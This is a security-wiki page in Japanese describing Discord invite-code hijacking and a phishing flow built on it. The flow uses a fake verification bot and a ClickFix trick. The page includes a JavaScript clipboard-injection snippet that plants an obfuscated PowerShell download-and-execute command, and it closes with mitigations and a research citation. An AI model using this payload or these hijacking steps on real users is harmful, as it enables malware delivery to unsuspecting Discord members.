# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord の invite system の脆弱性により、threat actor は期限切れまたは削除された invite code（temporary、permanent、custom vanity）を、Level 3 boosted server 上の新しい vanity link として取得できます。すべての code が lowercase に正規化されるため、攻撃者は既知の invite code を事前登録し、元の link が期限切れになるか、source server が boost を失った時点で、気付かれないまま traffic を hijack できます。<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | 期限切れになると code が利用可能になり、boosted server によって vanity URL として再登録できます。 |
| Permanent Invite Link | ⚠️          | 削除され、lowercase の letters と digits のみで構成されている場合、code が再び利用可能になることがあります。        |
| Custom Vanity Link    | ✅          | 元の server が Level 3 Boost を失うと、その vanity invite が新規登録用に利用可能になります。    |

## Exploitation Steps

1. Reconnaissance
- 公開ソース（forums、social media、Telegram channels）で、`discord.gg/{code}` または `discord.com/invite/{code}` のパターンに一致する invite link を監視します。<sup>[[1]](#references)</sup>
- 関心のある invite code（temporary または vanity）を収集します。
2. Pre-registration
- Level 3 Boost privileges を持つ Discord server を作成するか、既存のものを使用します。
- **Server Settings → Vanity URL** で、target invite code の割り当てを試みます。受け入れられた場合、code は malicious server によって予約されます。
3. Hijack Activation
- temporary invite の場合、元の invite が期限切れになるまで待ちます（または source を管理している場合は手動で削除します）。
- uppercase を含む code では、lowercase variant をすぐに取得できますが、redirection が有効になるのは期限切れ後です。
4. Silent Redirection
- hijack が有効になると、古い link にアクセスした users はシームレスに attacker-controlled server へ送られます。

## Phishing Flow via Discord Server

1. server channels を制限し、**#verify** channel だけが表示されるようにします。<sup>[[1]](#references)</sup>
2. bot（例：**Safeguard#0786**）を導入し、新規 users に OAuth2 で verify するよう促します。
3. bot は CAPTCHA または verification step を装い、users を phishing site（例：`captchaguard.me`）へ redirect します。
4. **ClickFix** UX trick を実装します。
- 壊れた CAPTCHA message を表示します。
- **Win+R** dialog を開き、preloaded PowerShell command を貼り付けて Enter を押すよう users を誘導します。

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
このアプローチではファイルを直接ダウンロードせず、見慣れた UI 要素を利用してユーザーの警戒心を低下させます。<sup>[[1]](#references)</sup>

## 対策

- 少なくとも 1 つの大文字または英数字以外の文字を含む永続的な invite links を使用する（有効期限がなく、再利用不可）。<sup>[[1]](#references)</sup>
- invite codes を定期的にローテーションし、古いリンクを revoke する。
- Discord server の boost status と vanity URL claims を監視する。
- server の正当性を確認し、clipboard に貼り付けられた commands を実行しないようユーザーに教育する。

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
